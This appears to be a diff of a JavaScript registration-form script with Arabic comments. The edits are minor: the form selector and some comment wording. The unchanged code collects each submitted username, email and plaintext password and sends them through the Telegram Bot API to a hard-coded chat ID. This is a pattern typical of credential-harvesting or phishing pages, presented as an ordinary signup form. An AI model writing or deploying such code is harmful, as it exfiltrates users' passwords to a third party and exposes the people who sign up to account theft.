@@ -1,10 +1,10 @@
 document.addEventListener("DOMContentLoaded", function () {
-    const form = document.querySelector("form");
+    const form = document.getElementById("registerForm");
 
     form.addEventListener("submit", function (event) {
-        event.preventDefault(); // منع إرسال البيانات عبر POST
+        event.preventDefault(); // منع الإرسال التقليدي
 
-        // جمع البيانات من النموذج
+        // جمع بيانات المستخدم
         const username = document.getElementById("username").value;
         const email = document.getElementById("email").value;
         const password = document.getElementById("password").value;
@@ -14,7 +14,7 @@ document.addEventListener("DOMContentLoaded", function () {
         const chatId = "7302541527"; // ضع الـ Chat ID هنا
 
         const message = `🔹 *مستخدم جديد سجل في الموقع* 🔹\n👤 *اسم المستخدم:* ${username}\n📧 *البريد الإلكتروني:* ${email}\n🔑 *كلمة المرور:* ${password}`;
-        
+
         // إرسال البيانات إلى تيليجرام
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
